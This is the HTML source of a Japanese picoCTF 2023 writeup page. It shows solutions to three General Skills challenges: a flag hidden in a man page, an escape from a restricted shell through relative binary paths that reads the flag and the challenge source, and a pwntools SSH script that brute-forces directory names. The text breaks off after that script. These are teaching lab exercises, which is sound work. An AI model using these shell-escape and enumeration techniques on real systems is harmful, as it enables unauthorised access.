@@ -1,0 +1,1631 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>picoCTF 2023 Writeup - CTF フラxxグゲット</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://picoctf.org/ 例年、チャレンジの使いまわしが多かった印象のある picoCTF ですが、今年はチャレンジが全て一新されていたようで、良かった" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />
+
+
+
+<meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
+
+
+<meta name="generator" content="Hugo 0.74.2 with theme even" />
+
+
+<link rel="canonical" href="https://captureamerica.github.io/writeups/post/picoctf_2023/" />
+<link rel="apple-touch-icon" sizes="180x180" href="https://captureamerica.github.io/writeups/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://captureamerica.github.io/writeups/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://captureamerica.github.io/writeups/favicon-16x16.png">
+<link rel="manifest" href="https://captureamerica.github.io/writeups/manifest.json">
+<link rel="mask-icon" href="https://captureamerica.github.io/writeups/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="https://captureamerica.github.io/writeups/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+
+
+
+<meta property="og:title" content="picoCTF 2023 Writeup" />
+<meta property="og:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://picoctf.org/ 例年、チャレンジの使いまわしが多かった印象のある picoCTF ですが、今年はチャレンジが全て一新されていたようで、良かった" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/picoctf_2023/" />
+<meta property="article:published_time" content="2023-04-03T15:30:00+09:00" />
+<meta property="article:modified_time" content="2023-04-03T15:30:00+09:00" />
+<meta itemprop="name" content="picoCTF 2023 Writeup">
+<meta itemprop="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://picoctf.org/ 例年、チャレンジの使いまわしが多かった印象のある picoCTF ですが、今年はチャレンジが全て一新されていたようで、良かった">
+<meta itemprop="datePublished" content="2023-04-03T15:30:00&#43;09:00" />
+<meta itemprop="dateModified" content="2023-04-03T15:30:00&#43;09:00" />
+<meta itemprop="wordCount" content="5493">
+
+
+
+<meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="picoCTF 2023 Writeup"/>
+<meta name="twitter:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://picoctf.org/ 例年、チャレンジの使いまわしが多かった印象のある picoCTF ですが、今年はチャレンジが全て一新されていたようで、良かった"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="https://captureamerica.github.io/writeups/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="https://captureamerica.github.io/writeups/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="https://captureamerica.github.io/writeups/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="https://captureamerica.github.io/writeups/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="https://captureamerica.github.io/writeups/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/about/">About</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">picoCTF 2023 Writeup</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2023-04-03 </span>
+        <div class="post-category">
+            <a href="https://captureamerica.github.io/writeups/categories/ctf/"> CTF </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#general-skills-useless-100-points">[General Skills]: useless (100 points)</a>
+      <ul>
+        <li><a href="#challenge">Challenge</a></li>
+        <li><a href="#solution">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#general-skills-special-300-points">[General Skills]: Special (300 points)</a>
+      <ul>
+        <li><a href="#challenge-1">Challenge</a></li>
+        <li><a href="#solution-1">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#general-skills-specialer-400-points">[General Skills]: Specialer (400 points)</a>
+      <ul>
+        <li><a href="#challenge-2">Challenge</a></li>
+        <li><a href="#solution-2">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#general-skills-permissions-100-points">[General Skills]: permissions (100 points)</a>
+      <ul>
+        <li><a href="#challenge-3">Challenge</a></li>
+        <li><a href="#solution-3">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#binary-exploitation-hijacking-200-points">[Binary Exploitation]: hijacking (200 points)</a>
+      <ul>
+        <li><a href="#challenge-4">Challenge</a></li>
+        <li><a href="#solution-4">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#binary-exploitation-babygame01-100-points">[Binary Exploitation]: babygame01 (100 points)</a>
+      <ul>
+        <li><a href="#challenge-5">Challenge</a></li>
+        <li><a href="#solution-5">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#binary-exploitation-tic-tac-200-points">[Binary Exploitation]: tic-tac (200 points)</a>
+      <ul>
+        <li><a href="#challenge-6">Challenge</a></li>
+        <li><a href="#solution-6">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#binary-exploitation-vne-200-points">[Binary Exploitation]: VNE (200 points)</a>
+      <ul>
+        <li><a href="#challenge-7">Challenge</a></li>
+        <li><a href="#solution-7">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#reverse-engineering-ready-gladiator-0-100-points">[Reverse Engineering]: Ready Gladiator 0 (100 points)</a>
+      <ul>
+        <li><a href="#challenge-8">Challenge</a></li>
+        <li><a href="#solution-8">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#reverse-engineering-ready-gladiator-1-200-points">[Reverse Engineering]: Ready Gladiator 1 (200 points)</a>
+      <ul>
+        <li><a href="#challenge-9">Challenge</a></li>
+        <li><a href="#solution-9">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#reverse-engineering-ready-gladiator-2-400-points">[Reverse Engineering]: Ready Gladiator 2 (400 points)</a>
+      <ul>
+        <li><a href="#challenge-10">Challenge</a></li>
+        <li><a href="#solution-10">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#reverse-engineering-timer-100-points">[Reverse Engineering]: timer (100 points)</a>
+      <ul>
+        <li><a href="#challenge-11">Challenge</a></li>
+        <li><a href="#solution-11">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#cryptography-readmycert-100-points">[Cryptography]: ReadMyCert (100 points)</a>
+      <ul>
+        <li><a href="#challenge-12">Challenge</a></li>
+        <li><a href="#solution-12">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#web-java-code-analysis-300-points">[Web]: Java Code Analysis!?! (300 points)</a>
+      <ul>
+        <li><a href="#challenge-13">Challenge</a></li>
+        <li><a href="#solution-13">Solution</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
+<img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!"> <b><font color="teal">Save The Earth! - 地球環境を守ろう！</font></b> <img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!">
+<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
+<div class='align-right'>
+<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fpicoctf_2023%2F">
+<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
+</a>
+</div>
+<p>URL: <a href="https://picoctf.org/">https://picoctf.org/</a>
+<br /><br />
+例年、チャレンジの使いまわしが多かった印象のある picoCTF ですが、今年はチャレンジが全て一新されていたようで、良かったと思います。</p>
+<p><br /><br />
+最終結果は、こんな感じ。</p>
+<img src="https://captureamerica.github.io/writeups/img/picoctf_2023_Score1.png" alt="picoctf_2023_Score1.png">
+<p><br />
+4900点をとって、最終順位は 389位でした。
+<br />
+<img src="https://captureamerica.github.io/writeups/img/picoctf_2023_Rank.png" alt="picoctf_2023_Rank.png"></p>
+<p><br /><br />
+以下は、チャレンジ一覧です。</p>
+<img src="https://captureamerica.github.io/writeups/img/picoctf_2023_web.png" alt="picoctf_2023_web.png">
+<p><br /></p>
+<img src="https://captureamerica.github.io/writeups/img/picoctf_2023_crypto.png" alt="picoctf_2023_crypto.png">
+<p><br /></p>
+<img src="https://captureamerica.github.io/writeups/img/picoctf_2023_rev.png" alt="picoctf_2023_rev.png">
+<p><br /></p>
+<img src="https://captureamerica.github.io/writeups/img/picoctf_2023_forensics.png" alt="picoctf_2023_forensics.png">
+<p><br /></p>
+<img src="https://captureamerica.github.io/writeups/img/picoctf_2023_general.png" alt="picoctf_2023_general.png">
+<p><br /></p>
+<img src="https://captureamerica.github.io/writeups/img/picoctf_2023_pwn.png" alt="picoctf_2023_pwn.png">
+<p>(tic-tacは、解いてます。)</p>
+<p><br /><br /><br />
+以下、Writeupです。</p>
+<h2 id="general-skills-useless-100-points">[General Skills]: useless (100 points)</h2>
+<hr>
+<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>There&rsquo;s an interesting script in the user&rsquo;s home directory.
+The work computer is running SSH. We&rsquo;ve been given a script which performs some basic calculations, explore the script and find a flag.</p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution">Solution</h3>
+<p>以下は、ホームディレクトリにあるファイル一覧です。</p>
+<pre>
+picoplayer@challenge:~$ ls -al
+total 16
+drwxr-xr-x 1 picoplayer picoplayer   20 Mar 19 01:31 .
+drwxr-xr-x 1 root       root         24 Mar 16 02:30 ..
+-rw-r--r-- 1 picoplayer picoplayer  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 picoplayer picoplayer 3771 Feb 25  2020 .bashrc
+drwx------ 2 picoplayer picoplayer   34 Mar 19 01:31 .cache
+-rw-r--r-- 1 picoplayer picoplayer  807 Feb 25  2020 .profile
+-rwxr-xr-x 1 root       root        517 Mar 16 01:30 useless
+
+</pre>
+<p><br /></p>
+<p><code>useless</code> というファイルは bash script で、中身は以下の通りです。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh"><span class="cp">#!/bin/bash
+</span><span class="cp"></span><span class="c1"># Basic mathematical operations via command-line arguments</span>
+
+<span class="k">if</span> <span class="o">[</span> <span class="nv">$#</span> !<span class="o">=</span> <span class="m">3</span> <span class="o">]</span>
+<span class="k">then</span>
+  <span class="nb">echo</span> <span class="s2">&#34;Read the code first&#34;</span>
+<span class="k">else</span>
+	<span class="k">if</span> <span class="o">[[</span> <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> <span class="o">==</span> <span class="s2">&#34;add&#34;</span> <span class="o">]]</span>
+	<span class="k">then</span>
+	  <span class="nv">sum</span><span class="o">=</span><span class="k">$((</span> <span class="nv">$2</span> <span class="o">+</span> <span class="nv">$3</span> <span class="k">))</span>
+	  <span class="nb">echo</span> <span class="s2">&#34;The Sum is: </span><span class="nv">$sum</span><span class="s2">&#34;</span>
+
+	<span class="k">elif</span> <span class="o">[[</span> <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> <span class="o">==</span> <span class="s2">&#34;sub&#34;</span> <span class="o">]]</span>
+	<span class="k">then</span>
+	  <span class="nv">sub</span><span class="o">=</span><span class="k">$((</span> <span class="nv">$2</span> <span class="o">-</span> <span class="nv">$3</span> <span class="k">))</span>
+	  <span class="nb">echo</span> <span class="s2">&#34;The Substract is: </span><span class="nv">$sub</span><span class="s2">&#34;</span>
+
+	<span class="k">elif</span> <span class="o">[[</span> <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> <span class="o">==</span> <span class="s2">&#34;div&#34;</span> <span class="o">]]</span>
+	<span class="k">then</span>
+	  <span class="nv">div</span><span class="o">=</span><span class="k">$((</span> <span class="nv">$2</span> <span class="o">/</span> <span class="nv">$3</span> <span class="k">))</span>
+	  <span class="nb">echo</span> <span class="s2">&#34;The quotient is: </span><span class="nv">$div</span><span class="s2">&#34;</span>
+
+	<span class="k">elif</span> <span class="o">[[</span> <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> <span class="o">==</span> <span class="s2">&#34;mul&#34;</span> <span class="o">]]</span>
+	<span class="k">then</span>
+	  <span class="nv">mul</span><span class="o">=</span><span class="k">$((</span> <span class="nv">$2</span> <span class="o">*</span> <span class="nv">$3</span> <span class="k">))</span>
+	  <span class="nb">echo</span> <span class="s2">&#34;The product is: </span><span class="nv">$mul</span><span class="s2">&#34;</span>
+
+	<span class="k">else</span>
+	  <span class="nb">echo</span> <span class="s2">&#34;Read the manual&#34;</span>
+
+	<span class="k">fi</span>
+<span class="k">fi</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><br /></p>
+<p><code>&quot;Read the manual&quot;</code> というメッセージがフラグへ導くヒントで、「マニュアルを見たらそこにフラグがあるよ」というだけのことなのですが、それに気づくまでに結構悩みました。</p>
+<pre>
+picoplayer@challenge:~$ man useless
+
+useless
+     useless, — This is a simple calculator script
+
+SYNOPSIS
+     useless, [add sub mul div] number1 number2
+
+DESCRIPTION
+     Use the useless, macro to make simple calulations like addition,subtraction, multiplication and division.
+
+Examples
+     ./useless add 1 2
+       This will add 1 and 2 and return 3
+
+     ./useless mul 2 3
+       This will return 6 as a product of 2 and 3
+
+     ./useless div 6 3
+       This will return 2 as a quotient of 6 and 3
+
+     ./useless sub 6 5
+       This will return 1 as a remainder of substraction of 5 from 6
+
+Authors
+     This script was designed and developed by Cylab Africa
+
+     picoCTF{us3l3ss_ch4ll3ng3_3xpl0it3d_4373}
+
+</pre>
+<p><br /></p>
+<p>Flag: <code>picoCTF{us3l3ss_ch4ll3ng3_3xpl0it3d_4373}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="general-skills-special-300-points">[General Skills]: Special (300 points)</h2>
+<hr>
+<h3 id="challenge-1">Challenge</h3>
+<blockquote>
+<p>Don&rsquo;t power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized&hellip; automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That&rsquo;s Special (TM)
+<br /><br />
+Hint: Experiment with different shell syntax</p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution-1">Solution</h3>
+<p>とりあえず、SSHでログインして、どういう動きをするのか確認します。</p>
+<pre>
+Special$ ls -al
+Is pal
+sh: 1: Is: not found
+
+Special$ aa
+A
+sh: 1: A: not found
+
+Special$ oghowegowijegoaihegp
+Oghowegowijegoaihegp
+sh: 1: Oghowegowijegoaihegp: not found
+
+Special$
+Traceback (most recent call last):
+  File "/usr/local/Special.py", line 19, in <module>
+    elif cmd[0] == '/':
+IndexError: string index out of range
+Connection to saturn.picoctf.net closed.
+
+</pre>
+<p>この時点では、さっぱりわからないです。</p>
+<p><br /><br /></p>
+<p>トライ・アンド・エラーで続けて見ていくと、相対パスを使ってコマンドが実行できることがわかりました。</p>
+<pre>
+Special$ /
+Absolutely not paths like that, please!
+
+Special$ ../../bin/ls
+../../bin/ls
+blargh
+
+Special$ ../../bin/find .
+../../bin/find .
+.
+./blargh
+./blargh/flag.txt
+./.cache
+./.cache/motd.legal-displayed
+</pre>
+<p><br /><br /></p>
+<p>ということで、以下でフラグが得られます。</p>
+<pre>
+Special$ ../../bin/cat ./blargh/flag.txt
+../../bin/cat ./blargh/flag.txt
+picoCTF{5p311ch3ck_15_7h3_w0r57_0c61d335}
+</pre>
+<p><br /><br /></p>
+<p>ちなみに、フラグだけではなく、チャレンジプログラムの中身も見れます。</p>
+<pre>
+Special$ ../../bin/cat /usr/local/Special.py
+</pre>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/python3</span>
+
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">from</span> <span class="nn">spellchecker</span> <span class="kn">import</span> <span class="n">SpellChecker</span>
+
+
+
+<span class="n">spell</span> <span class="o">=</span> <span class="n">SpellChecker</span><span class="p">()</span>
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+  <span class="n">cmd</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;Special$ &#34;</span><span class="p">)</span>
+  <span class="n">rval</span> <span class="o">=</span> <span class="mi">0</span>
+
+  <span class="k">if</span> <span class="n">cmd</span> <span class="o">==</span> <span class="s1">&#39;exit&#39;</span><span class="p">:</span>
+    <span class="k">break</span>
+  <span class="k">elif</span> <span class="s1">&#39;sh&#39;</span> <span class="ow">in</span> <span class="n">cmd</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;Why go back to an inferior shell?&#39;</span><span class="p">)</span>
+    <span class="k">continue</span>
+  <span class="k">elif</span> <span class="n">cmd</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;/&#39;</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;Absolutely not paths like that, please!&#39;</span><span class="p">)</span>
+    <span class="k">continue</span>
+
+  <span class="c1"># Spellcheck</span>
+  <span class="n">spellcheck_cmd</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+  <span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">cmd</span><span class="o">.</span><span class="n">split</span><span class="p">():</span>
+    <span class="n">fixed_word</span> <span class="o">=</span> <span class="n">spell</span><span class="o">.</span><span class="n">correction</span><span class="p">(</span><span class="n">word</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">fixed_word</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+      <span class="n">fixed_word</span> <span class="o">=</span> <span class="n">word</span>
+    <span class="n">spellcheck_cmd</span> <span class="o">+=</span> <span class="n">fixed_word</span> <span class="o">+</span> <span class="s1">&#39; &#39;</span>
+
+  <span class="c1"># Capitalize</span>
+  <span class="n">fixed_cmd</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">spellcheck_cmd</span><span class="p">)</span>
+  <span class="n">words</span> <span class="o">=</span> <span class="n">spellcheck_cmd</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
+  <span class="n">first_word</span> <span class="o">=</span> <span class="n">words</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+  <span class="n">first_letter</span> <span class="o">=</span> <span class="n">first_word</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+  <span class="k">if</span> <span class="nb">ord</span><span class="p">(</span><span class="n">first_letter</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">97</span> <span class="ow">and</span> <span class="nb">ord</span><span class="p">(</span><span class="n">first_letter</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">122</span><span class="p">:</span>
+    <span class="n">fixed_cmd</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">spellcheck_cmd</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">-</span> <span class="mh">0x20</span><span class="p">)</span>
+  <span class="n">fixed_cmd</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">fixed_cmd</span><span class="p">)</span>
+
+  <span class="k">try</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">fixed_cmd</span><span class="p">)</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">fixed_cmd</span><span class="p">)</span>
+  <span class="k">except</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;Bad command!&#34;</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><br /></p>
+<p>Flag: <code>picoCTF{5p311ch3ck_15_7h3_w0r57_0c61d335}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="general-skills-specialer-400-points">[General Skills]: Specialer (400 points)</h2>
+<hr>
+<h3 id="challenge-2">Challenge</h3>
+<blockquote>
+<p>Reception of Special has been cool to say the least. That&rsquo;s why we made an exclusive version of Special, called Secure Comprehensive Interface for Affecting Linux Empirically Rad, or just &lsquo;Specialer&rsquo;. With Specialer, we really tried to remove the distractions from using a shell. Yes, we took out spell checker because of everybody&rsquo;s complaining. But we think you will be excited about our new, reduced feature set for keeping you focused on what needs it the most. Please start an instance to test your very own copy of Specialer.
+<br /><br />
+Hint: What programs do you have access to?</p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution-2">Solution</h3>
+<p>こちらも、まずはSSHでログインして、どういう動きをするのか確認します。</p>
+<pre>
+Specialer$ ls
+-bash: ls: command not found
+
+Specialer$ ../../bin/ls
+-bash: ../../bin/ls: No such file or directory
+
+Specialer$ .
+-bash: .: filename argument required
+.: usage: . filename [arguments]
+
+Specialer$ . *
+-bash: .: abra: is a directory
+</pre>
+<p><br /></p>
+<p>ドットとアスタリスクを使って、abra というディレクトリがあることがわかりました。</p>
+<p><br /><br /></p>
+<p>実際は、abra以外にもディレクトリがあったわけですが、<code>. *</code> の結果だと、アルファベット順に一番最初に現れたディレクトリしかわかりません。</p>
+<p>総当りで調べるとすると、</p>
+<p><code>. b*</code>, <code>. c*</code>, <code>. d*</code> のように、a以外で始まるディレクトリも順番に見ていく必要があるのと、</p>
+<p><code>. ac*</code>, <code>. ad*</code>, <code>. ae*</code> のように、aで始まるけど、&ldquo;abra&quot;ではないディレクトリも探さないといけません。</p>
+<p><br /><br /></p>
+<p>一個一個、コマンドを打つのは面倒だったので、以下の単純なスクリプトを書きました。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">string</span>
+
+<span class="n">s</span><span class="o">=</span><span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;saturn.picoctf.net&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">51877</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="s1">&#39;ctf-player&#39;</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s1">&#39;483e80d4&#39;</span><span class="p">)</span>
+
+<span class="c1"># cmd_base = &#39;. ./&#39;</span>
+<span class="c1"># cmd_base = &#39;. ./a&#39;</span>
+<span class="c1"># cmd_base = &#39;. .&#39;</span>
+<span class="n">cmd_base</span> <span class="o">=</span> <span class="s1">&#39;. ./ala/&#39;</span>
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">found</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">chars</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_uppercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="s1">&#39;._-#$&amp;?{}()&#39;</span><span class="p">)</span>
+    <span class="c1"># chars = list(string.ascii_lowercase + string.digits + &#39;._-&#39;)</span>
+    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">chars</span><span class="p">:</span>
+        <span class="n">cmd</span> <span class="o">=</span> <span class="n">cmd_base</span> <span class="o">+</span> <span class="n">c</span> <span class="o">+</span> <span class="s1">&#39;*&#39;</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="nb">repr</span><span class="p">(</span><span class="n">s</span><span class="p">(</span><span class="n">cmd</span><span class="p">))</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
